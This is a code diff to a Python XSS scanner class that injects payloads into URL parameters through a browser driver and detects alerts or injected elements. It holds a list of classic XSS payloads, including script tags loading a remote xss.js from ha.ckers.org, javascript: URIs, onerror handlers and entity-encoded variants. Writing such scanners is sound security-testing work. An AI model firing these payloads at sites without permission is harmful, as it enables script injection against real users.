@@ -6,16 +6,34 @@ import utils
 
 class XssChecker(object):
 
-    small_xss_list = ['<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
-                     ]
+    xss_urls = set([])
 
-    big_xss_list = ['<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
+    small_xss_list = ['<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>']
+
+    dict = {
+        '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>':['SCRIPT', {'SRC':'http://ha.ckers.org/xss.js'}],
+        '<IMG SRC="javascript:alert(\'XSS\')">': ['IMG', {'SRC':'javascript:alert(\'XSS\')'}],
+        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>': ["IMG", {'SRC':'javascript'}],
+        '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">': ['IMG', {'innerHTML':'alert'}],
+        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>': ["IMG", {'SRC': "fromCharCode(88,83,83)"}],
+        '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>': ["IMG", {'ONERROR': "fromCharCode(88,83,83)"}],
+        #'<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>': ["IMG", {'SRC': 'javascript'}], # DOESNT WORK
+
+
+
+
+        #'<a href="?query=">Link to search result</a>': ['a', {'href': '?query=', "innerHTML": "Link to search result"}],
+
+            }
+
+    big_xss_list = [  '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
                       '<IMG SRC="javascript:alert(\'XSS\');">',
                       '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
                       '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
                       '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
                       '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
                       '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
+
                       '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
                       '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
                       '<IMG SRC="jav	ascript:alert(\'XSS\');">',
@@ -155,17 +173,42 @@ class XssChecker(object):
         self.driver = driver
 
     def find_xss(self, url):
-        for i in self.medium_xss_list:
-            xss_url = url.replace(utils.KEY, i)
+        for xss_script in self.medium_xss_list:
+            xss_url = url.replace(utils.KEY, xss_script)
             page = Page(self.driver, xss_url)
             page.open()
-            print('trying - ', i, "  on:  ", url)
+            print('trying - ', xss_script, "  on:  ", url)
             if (page.is_alert_appear()):
                 page.get_alert_text_and_close() # NEED TO CHECK TEXT!
                 print('xss was found on: ', xss_url)
                 return xss_url # Maybe all variants ???
 
         return False
+
+    def find_xss_dict(self, url):
+        for xss_script in self.dict:
+            xss_url = url.replace(utils.KEY, xss_script)
+            page = Page(self.driver, xss_url)
+            page.open()
+
+            print("trying: ", xss_url)
+
+            if (page.is_alert_appear()):
+                page.get_alert_text_and_close()
+                print('xss was found on: ', xss_url)
+                self.xss_urls.add(xss_url)
+                break
+            else:
+                tag = self.dict[xss_script][0]
+                attr = self.dict[xss_script][1]
+                if (page.find_element_by_tag_and_attributes(tag=tag, attr=attr)):
+                    print('xss was found on: ', xss_url)
+                    self.xss_urls.add(xss_url)
+
+        print(self.xss_urls)
+
+
+
 
 
 
